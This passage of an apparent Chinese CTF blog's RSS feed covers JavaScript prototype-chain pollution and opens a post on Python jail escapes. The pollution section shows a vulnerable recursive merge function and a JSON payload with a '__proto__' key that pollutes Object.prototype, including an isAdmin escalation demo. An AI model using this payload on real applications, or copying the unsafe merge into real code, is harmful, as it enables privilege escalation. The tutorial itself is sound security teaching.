&lt;p&gt;在 JS 中，每个函数对象还有一个特殊的属性叫做 &lt;code&gt;constructor&lt;/code&gt; 。这个属性指向创建该对象的构造函数。当我们创建一个函数时，JS 会自动为该函数创建一个 &lt;code&gt;prototype&lt;/code&gt;  对象，并且这个 &lt;code&gt;prototype&lt;/code&gt;  对象包含一个指向该函数本身的 &lt;code&gt;constructor&lt;/code&gt;  属性。&lt;/p&gt;
&lt;p&gt;当我们使用构造函数创建实例对象时，这些实例对象会继承构造函数的 &lt;code&gt;prototype&lt;/code&gt;  对象，从而形成原型链。因此，通过 &lt;code&gt;constructor&lt;/code&gt;  属性，实例对象就可以访问到创建它们的构造函数。&lt;/p&gt;
&lt;p&gt;直接把 &lt;code&gt;constructor&lt;/code&gt;  当作反向 &lt;code&gt;prototype&lt;/code&gt;  理解即可。以刚才的代码举例：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Javascript&#34;&gt;&lt;figure class=&#34;iseeu highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(&lt;span class=&#34;title class_&#34;&gt;Dog&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;prototype&lt;/span&gt;&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;constructor&lt;/span&gt; === &lt;span class=&#34;title class_&#34;&gt;Dog&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h2 id=&#34;原型链&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原型链&#34;&gt;#&lt;/a&gt; 原型链&lt;/h2&gt;
&lt;p&gt;通俗来讲就是 js 中类之间因继承机制而产生的线性关系。&lt;/p&gt;
&lt;h3 id=&#34;污染&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#污染&#34;&gt;#&lt;/a&gt; 污染&lt;/h3&gt;
&lt;p&gt;原理很简单，就是 JS 基于原型链实现的继承机制。如果我们能控制某个对象的原型，那我们就可以控制所有基于该原型创建的对象。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Js&#34;&gt;&lt;figure class=&#34;iseeu highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// foo是一个简单的JavaScript对象&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;let&lt;/span&gt; foo = &amp;#123;&lt;span class=&#34;attr&#34;&gt;bar&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// foo.bar 此时为1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(foo.&lt;span class=&#34;property&#34;&gt;bar&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 修改foo的原型（即Object）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;foo.&lt;span class=&#34;property&#34;&gt;__proto__&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;bar&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 由于查找顺序的原因，foo.bar仍然是1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(foo.&lt;span class=&#34;property&#34;&gt;bar&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 此时再用Object创建一个空的zoo对象&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;let&lt;/span&gt; zoo = &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 查看zoo.bar&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(zoo.&lt;span class=&#34;property&#34;&gt;bar&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;最后，虽然 zoo 是一个&lt;strong&gt;空&lt;/strong&gt;对象 &lt;code&gt;&amp;#123;&amp;#125;&lt;/code&gt; ，但 &lt;code&gt;zoo.bar&lt;/code&gt;  的结果居然是 2：&lt;/p&gt;
&lt;p&gt;原因也显而易见：因为前面我们修改了 foo 的原型 &lt;code&gt;foo.__proto__.bar = 2&lt;/code&gt; ，而 foo 是一个 Object 类的实例，所以实际上是修改了 Object 这个类，给这个类增加了一个属性 bar，值为 2。&lt;/p&gt;
&lt;p&gt;后来，我们又用 Object 类创建了一个 zoo 对象 &lt;code&gt;let zoo = &amp;#123;&amp;#125;&lt;/code&gt; ，zoo 对象自然也有一个 bar 属性了。&lt;/p&gt;
&lt;p&gt;那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是&lt;strong&gt;原型链污染&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;以下是一个简单的示范案例：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Javascript&#34;&gt;&lt;figure class=&#34;iseeu highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 创建一个空对象 userA&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;let&lt;/span&gt; userA = &amp;#123;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 给 userA 添加一个属性 isAdmin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;userA.&lt;span class=&#34;property&#34;&gt;isAdmin&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(userA.&lt;span class=&#34;property&#34;&gt;isAdmin&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 现在我们想让所有用户都有这个属性，我们可以使用原型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;userA.&lt;span class=&#34;property&#34;&gt;__proto__&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;isAdmin&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(userA.&lt;span class=&#34;property&#34;&gt;isAdmin&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 现在我们创建一个新用户 userB&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;let&lt;/span&gt; userB = &amp;#123;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// userB 会继承 userA 的 isAdmin 属性&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(userB.&lt;span class=&#34;property&#34;&gt;isAdmin&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;在 CTF 中，往往都是去找一些能够控制对象键名的操作，比如 &lt;code&gt;merge&lt;/code&gt; 、 &lt;code&gt;clone&lt;/code&gt;  等，这其中 &lt;code&gt;merge&lt;/code&gt;  又是最常见的可操纵键名操作。最普通的 &lt;code&gt;merge&lt;/code&gt;  函数如下：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Javascript&#34;&gt;&lt;figure class=&#34;iseeu highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;merge&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;target, source&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;let&lt;/span&gt; key &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; source) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (key &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; source &amp;amp;&amp;amp; key &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; target) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;title function_&#34;&gt;merge&lt;/span&gt;(target[key], source[key])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          target[key] = source[key]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;此时，我们运行以下代码，以 JSON 格式创建 &lt;code&gt;o2&lt;/code&gt; ，在与 &lt;code&gt;o1&lt;/code&gt;  合并的过程中，经过赋值操作 &lt;code&gt;target[key] = source[key]&lt;/code&gt; ，实现了一个基本的原型链污染，被污染的对象是 &lt;code&gt;Object.prototype&lt;/code&gt; ：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Javascript&#34;&gt;&lt;figure class=&#34;iseeu highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;let&lt;/span&gt; o1 = &amp;#123;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;let&lt;/span&gt; o2 = &lt;span class=&#34;title class_&#34;&gt;JSON&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;parse&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;&amp;quot;a&amp;quot;: 1, &amp;quot;__proto__&amp;quot;: &amp;#123;&amp;quot;b&amp;quot;: 2&amp;#125;&amp;#125;&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;merge&lt;/span&gt;(o1, o2); &lt;span class=&#34;comment&#34;&gt;// 1 2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(o1.&lt;span class=&#34;property&#34;&gt;a&lt;/span&gt;, o1.&lt;span class=&#34;property&#34;&gt;b&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;o3 = &amp;#123;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(o3.&lt;span class=&#34;property&#34;&gt;b&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// 2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(&lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;prototype&lt;/span&gt;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// [Object: null prototype] &amp;#123; b: 2 &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2024/05/06/PyJail/</guid>
            <title>PyJail</title>
            <link>http://example.com/2024/05/06/PyJail/</link>
            <pubDate>Mon, 06 May 2024 22:42:33 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;pyjail&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pyjail&#34;&gt;#&lt;/a&gt; PyJail&lt;/h1&gt;
&lt;h2 id=&#34;python的一些特性&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python的一些特性&#34;&gt;#&lt;/a&gt; Python 的一些特性&lt;/h2&gt;
&lt;h3 id=&#34;object类的继承&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#object类的继承&#34;&gt;#&lt;/a&gt; object 类的继承&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Python3.x&lt;/code&gt;  版本中，类默认会继承 &lt;code&gt;object&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但在 &lt;code&gt;Python2.x&lt;/code&gt;  中，默认不会继承&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# python2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Person&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    不带object&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    name = &lt;span class=&#34;string&#34;&gt;&amp;quot;zhengtong&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Animal&lt;/span&gt;(&lt;span class=&#34;title class_ inherited__&#34;&gt;object&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    带有object&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    name = &lt;span class=&#34;string&#34;&gt;&amp;quot;chonghong&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x = Person()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Person&amp;quot;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;dir&lt;/span&gt;(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    y = Animal()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Animal&amp;quot;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;dir&lt;/span&gt;(y)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;运行结果：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Person [&amp;#x27;__doc__&amp;#x27;, &amp;#x27;__module__&amp;#x27;, &amp;#x27;name&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Animal [&amp;#x27;__class__&amp;#x27;, &amp;#x27;__delattr__&amp;#x27;, &amp;#x27;__dict__&amp;#x27;, &amp;#x27;__doc__&amp;#x27;, &amp;#x27;__format__&amp;#x27;, &amp;#x27;__getattribute__&amp;#x27;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;__hash__&amp;#x27;, &amp;#x27;__init__&amp;#x27;, &amp;#x27;__module__&amp;#x27;, &amp;#x27;__new__&amp;#x27;, &amp;#x27;__reduce__&amp;#x27;, &amp;#x27;__reduce_ex__&amp;#x27;, &amp;#x27;__repr__&amp;#x27;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;__setattr__&amp;#x27;, &amp;#x27;__sizeof__&amp;#x27;, &amp;#x27;__str__&amp;#x27;, &amp;#x27;__subclasshook__&amp;#x27;, &amp;#x27;__weakref__&amp;#x27;, &amp;#x27;name&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;python中类本身具有一些静态方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python中类本身具有一些静态方法&#34;&gt;#&lt;/a&gt; python 中类本身具有一些静态方法&lt;/h3&gt;
